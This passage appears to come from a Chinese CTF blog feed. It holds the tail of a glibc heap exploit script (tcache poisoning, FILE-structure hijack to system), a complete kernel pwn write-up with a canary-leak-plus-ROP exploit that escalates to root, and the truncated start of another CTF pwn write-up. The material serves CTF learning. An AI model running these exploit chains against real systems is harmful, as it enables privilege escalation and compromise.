key))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">13</span>, (<span class="hljs-string">b&#x27;\x07&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)*<span class="hljs-number">24</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_base = l64() - <span class="hljs-number">0x203b20</span>  <br>ph(libc_base)<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>ph(IO_list_all)<br>time.sleep(<span class="hljs-number">1</span>)  <br><br>edit(<span class="hljs-number">11</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)*<span class="hljs-number">24</span>)<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br>edit(<span class="hljs-number">13</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)*<span class="hljs-number">24</span>)<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br>add(<span class="hljs-number">14</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">15</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>edit(<span class="hljs-number">13</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)*<span class="hljs-number">2</span> + (<span class="hljs-string">b&#x27;\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>, p64(IO_list_all ^ key))<br>add(<span class="hljs-number">17</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">18</span>, p64(heap_base + <span class="hljs-number">0x2e0</span>))<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br>IO_addr = heap_base + <span class="hljs-number">0x2d0</span><br>IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br><br>IO = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&#x27;;sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x8</span>: p64(<span class="hljs-number">0x420</span>),<br>        <span class="hljs-number">0x28</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-number">0xa0</span>: IO_addr + <span class="hljs-number">0xd8</span> - <span class="hljs-number">0xb0</span>,<br>        <span class="hljs-number">0xd8</span>: IO_wfile_jumps,<br>        <span class="hljs-number">0xe0</span>: IO_addr,<br>    &#125;,<br>    filler=<span class="hljs-string">b&#x27;\x00&#x27;</span><br>)<br>edit(<span class="hljs-number">14</span>, IO[<span class="hljs-number">0x0</span>:<span class="hljs-number">0x30</span>])<br>time.sleep(<span class="hljs-number">0.2</span>)<br>edit(<span class="hljs-number">15</span>, IO[<span class="hljs-number">0x40</span>:<span class="hljs-number">0x70</span>])<br>time.sleep(<span class="hljs-number">0.2</span>)<br>edit(<span class="hljs-number">16</span>, IO[<span class="hljs-number">0x80</span>:<span class="hljs-number">0xb0</span>])<br>time.sleep(<span class="hljs-number">0.2</span>)<br>edit(<span class="hljs-number">7</span>, IO[<span class="hljs-number">0xc0</span>:<span class="hljs-number">0xf0</span>])<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>free(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">4</span> + p64(heap_base + <span class="hljs-number">0x3d0</span>))<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br>add(<span class="hljs-number">19</span>, <span class="hljs-string">b&#x27;\00&#x27;</span>*<span class="hljs-number">8</span>)<br>ph(IO_addr)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>ph(system)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>edit(<span class="hljs-number">19</span>, <span class="hljs-string">b&#x27;\00&#x27;</span>*<span class="hljs-number">8</span> + p64(heap_base + <span class="hljs-number">0x2a0</span> - <span class="hljs-number">0x68</span>)*<span class="hljs-number">4</span>)<br>time.sleep(<span class="hljs-number">0.2</span>)<br><br>edit(<span class="hljs-number">0</span>, p64(system)*<span class="hljs-number">6</span>)<br>exit()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>kernelpwn练习题-其一</title>
    <link href="/2025/07/17/kernelpwn%E7%BB%83%E4%B9%A0%E9%A2%98-%E5%85%B6%E4%B8%80/"/>
    <url>/2025/07/17/kernelpwn%E7%BB%83%E4%B9%A0%E9%A2%98-%E5%85%B6%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该系列文章将会记录内核pwn从零到一的练习过程，本文章建议与<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/">CTF Wiki-kernel_ROP部分</a> 搭配食用。</p><h2 id="例题：-CATCTF2022-kernel-test"><a href="#例题：-CATCTF2022-kernel-test" class="headerlink" title="例题：[CATCTF2022]  kernel-test"></a>例题：[CATCTF2022]  kernel-test</h2><p>题目附件：<a href="https://z-l-s-f.lanzouq.com/io27D319gnad">https://z-l-s-f.lanzouq.com/io27D319gnad</a> </p><p>附件密码：f389</p><p>远程容器：<a href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> </p><p>远程容器需要在pwn分页中搜索kernel-test可找到。</p><p>boot.sh:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 256M \<br>    -nographic \<br>    -kernel ./bzImage \<br>    -initrd  ./new.cpio \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>    -smp cores=2,threads=1 \<br>    -monitor /dev/null \<br>    -gdb tcp::9999<br></code></pre></td></tr></table></figure><p>此处我们可以发现容器中将开启kaslr。</p><p>init：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;INIT SCRIPT&quot;</span><br><span class="hljs-built_in">mkdir</span> /tmp<br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs none /dev<br>mount -t debugfs none /sys/kernel/debug<br>mount -t tmpfs none /tmp<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><br><span class="hljs-built_in">chown</span> 0:0 flag<br><span class="hljs-built_in">chmod</span> 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br><br>insmod ./HRPKO.ko <span class="hljs-comment"># 挂载内核模块</span><br><span class="hljs-built_in">chmod</span> 777 /dev/test<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Boot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span><br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-comment">#setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span><br>poweroff -f <span class="hljs-comment"># 设置 shell 退出后则关闭机器</span><br></code></pre></td></tr></table></figure><p>通过文件系统中的 init 我们发现操作系统会预先将 &#x2F;proc&#x2F;kallsyms 中的内容写入到 &#x2F;tmp&#x2F;kallsyms 中，这使得我们在普通用户权限下仍然可以查看到内核函数的运行地址，由此我们可以计算出内核基地址。</p><p>ida：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">HRP_module_read</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">22</span>]; <span class="hljs-comment">// [rsp-60h] [rbp-60h] BYREF</span><br>  __int16 v6; <span class="hljs-comment">// [rsp-4Ah] [rbp-4Ah]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp-48h] [rbp-48h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp-40h] [rbp-40h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp-38h] [rbp-38h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp-30h] [rbp-30h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp-28h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v12; <span class="hljs-comment">// [rsp-20h] [rbp-20h]</span><br><br>  _fentry__(a1, a2);<br>  v3 = v2;<br>  v5[<span class="hljs-number">21</span>] = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0LL</span>;<br>  v12 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v9 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;welcome to my house\n&quot;</span>);<br>  v10 = <span class="hljs-number">0LL</span>;<br>  v11 = <span class="hljs-number">0LL</span>;<br>  printk(&amp;unk_375);<br>  copy_to_user(a2, &amp;v5[v3], <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">114514LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>HRP_module_read 函数会从内核栈中的 v5[rdx] 开始取64字节的内容放入我们的用户栈指针 a2 中，我们可以利用此处来获得内核中canary的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">HRP_module_write</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(a1, a2);<br>  v3 = v2;<br>  printk(&amp;unk_384);<br>  <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">0x300</span> )<br>  &#123;<br>    _warn_printk(<span class="hljs-string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="hljs-number">768LL</span>, v3);<br>    BUG();<br>  &#125;<br>  _check_object_size(pwn, v3, <span class="hljs-number">0LL</span>);<br>  copy_from_user(pwn, a2, v3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">114514LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>HRP_module_write 会从用户栈 a2 读取并向向该程序的 data 段 pwn 写入最多0x300的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">HRP_module_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rbp</span><br>  _QWORD v4[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp-20h] [rbp-20h] BYREF</span><br><br>  _fentry__(a1, a2);<br>  v4[<span class="hljs-number">3</span>] = v2;<br>  v4[<span class="hljs-number">2</span>] = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( (_DWORD)a2 )<br>  &#123;<br>    printk(&amp;unk_3C8);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_359);<br>    qmemcpy(v4, pwn, <span class="hljs-number">0x100</span>uLL);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>HRP_module_ioctl 函数会从 data 段 pwn 中读取最多0x100写入 v4 中，此处可造成内核栈溢出。</p><p>接下来我们可以开始编辑exp。</p><p>首先我们需要获得内核基地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810ccc30</span><br><br>fp = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>&#123;<br>commit_creds = addr;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find commit_creds: 0x%lx\n&quot;</span>, commit_creds);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">nm ./vmlinux | grep &quot;commit_creds&quot;         </span><br><span class="hljs-comment">ffffffff810ccc30 T commit_creds</span><br><span class="hljs-comment">*/</span><br><br>kernel_offset = commit_creds - COMMIT_CREDS;<br>kernel_base += kernel_offset;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find kernel_base: 0x%lx\n&quot;</span>, kernel_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find kernel_offset: 0x%lx\n&quot;</span>,kernel_offset);<br><br>fclose(fp);<br></code></pre></td></tr></table></figure><p>此处我们通过遍历 &#x2F;tmp&#x2F;kallsyms 找到 commit_creds 的运行地址与其在 vmlinux 中的静态地址相减即可得到内核基地址。</p><p>在获得内核基地址后我们可以开始着手获得内核栈上的canary：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">fd = open(<span class="hljs-string">&quot;/dev/test&quot;</span>, O_RDWR);<br><br>read(fd, buf, <span class="hljs-number">64</span>);<br>canary = ((<span class="hljs-type">size_t</span>*)buf)[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Canary: 0x%lx\n&quot;</span>, canary);<br></code></pre></td></tr></table></figure><p>此处需要我们攻击的驱动的位置可以在 init 文件中查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">chmod</span> 777 /dev/test<br></code></pre></td></tr></table></figure><p>一般像这种特别设置成对所有人开放的文件，就是我们攻击的驱动入口。</p><p>我们通过 read 调用 HRP_module_read 来获得内核栈的canary，通过静态偏移计算我们可以得知 read 的 rdx 应该设置成0x40（rbp - 60h 到 rbp - 20h）。</p><p>然后我们可以开始构造并写入攻击用的ROP：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI 0xffffffff8108db10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff8103b82b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP 0xffffffff8107a4d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63880</span><br><br>i = <span class="hljs-number">0</span>;<br>rop = (<span class="hljs-type">size_t</span>*)buf;<br><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = canary;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = POP_RDI + kernel_offset;<br>rop[i++] = INIT_CRED + kernel_offset;<br>rop[i++] = commit_creds;<br>rop[i++] = SWAPGS_POP_RBP + kernel_offset;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = IRETQ + kernel_offset;<br>rop[i++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp + <span class="hljs-number">8</span>;<br>rop[i++] = user_ss;<br><br>write(fd, buf, <span class="hljs-number">0x300</span>);<br></code></pre></td></tr></table></figure><p>这里我并不打算采用 commit_creds(prepare_kernel_cred(NULL)) 的方式来完成权限的提升，因为使用这种方法还需要再次将 rax 传入 rdi 中还要保证有 ret 。</p><p>所以我们直接 commit_creds(init_cred) 即可，init 是 linux 第一个启动的程序，我感觉是在 vmlinx 早就留有固定的位置，此时我们构造ROP会更简单。</p><p>最后通过 ioctl 实现栈溢出的复制和触发即可完成提权到 root 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">ioctl(fd, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kernelpwn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810ccc30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI 0xffffffff8108db10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff8103b82b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP 0xffffffff8107a4d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63880</span><br><br><span class="hljs-type">size_t</span> commit_creds;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> fd, i;<br>FILE *fp;<br><span class="hljs-type">size_t</span> addr, canary;<br><span class="hljs-type">size_t</span>* rop;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x300</span>], type[<span class="hljs-number">0x10</span>];<br><br>save_status();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Exp Start...\n&quot;</span>);<br><br>fp = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>&#123;<br>commit_creds = addr;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find commit_creds: 0x%lx\n&quot;</span>, commit_creds);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br>kernel_offset = commit_creds - COMMIT_CREDS;<br>kernel_base += kernel_offset;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find kernel_base: 0x%lx\n&quot;</span>, kernel_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Find kernel_offset: 0x%lx\n&quot;</span>,kernel_offset);<br><br>fclose(fp);<br><br>fd = open(<span class="hljs-string">&quot;/dev/test&quot;</span>, O_RDWR);<br><br>read(fd, buf, <span class="hljs-number">64</span>);<br>canary = ((<span class="hljs-type">size_t</span>*)buf)[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Canary: 0x%lx\n&quot;</span>, canary);<br><br>i = <span class="hljs-number">0</span>;<br>rop = (<span class="hljs-type">size_t</span>*)buf;<br><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = canary;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = POP_RDI + kernel_offset;<br>rop[i++] = INIT_CRED + kernel_offset;<br>rop[i++] = commit_creds;<br>rop[i++] = SWAPGS_POP_RBP + kernel_offset;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = IRETQ + kernel_offset;<br>rop[i++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp + <span class="hljs-number">8</span>;<br>rop[i++] = user_ss;<br><br>write(fd, buf, <span class="hljs-number">0x300</span>);<br><br>ioctl(fd, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>扩展（来自arttnba3大佬的kernelpwn中常用的头文件和函数以及一些变量）：</p><p>下载 <a href="https://z-l-s-f.lanzouq.com/iqCLP32vxc4b">kernelpwn.h</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>蜀道山CTF-PWN全解WP</title>
    <link href="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/"/>
    <url>/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/</url>
    
    <content type="html"><![CDATA[<hr><p>蜀道山CTF-PWN附件下载：<a href="https://z-l-s-f.lanzouq.com/ixEZc2g31zdg">https://z-l-s-f.lanzouq.com/ixEZc2g31zdg</a></p><hr><h3 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a><strong>one_heap</strong></h3><p>​check：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428396401.png"></p><p>​题目保护全开</p><p>​漏洞点：</p><p>​1.</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428501259.png"></p><p>​uaf漏洞。</p><p>​2.</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428563665.png"></p><p>​输出指向当前堆块的地址（而非堆块的内容）。</p><p>​思路：</p><p>​题目只允许一次操作一个堆块，但是我们可以通过magic函数来造成tcachebin的uaf，释放任意一堆块获得heap的基地址，通过tcatche的uaf申请到tcachebin的开头（也就是堆块的起始地址这个位置，这里记录了tcache堆块的所有信息，我们可以修改这个地方影响tcachebin的行为）。</p><p>​通过修改堆块0x290的数量为7，释放tcachebin头进入unsortbins，此时堆中出现了libc的地址，申请合适的堆块来让这个libc地址到0x100的范围中，通过申请0xF8可以将堆块申请到这个libc地址上（不能将unsortbin构造到其他地址是因为高libc版本会有加密，加密后申请是必不会成功的）。</p><p>​通过magic输出libc的地址后可得libc的基地址。</p><p>​通过正常的tcachebin attack劫持_IO_list_all到堆中打house of apple2即可完成攻击。</p><p>​exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 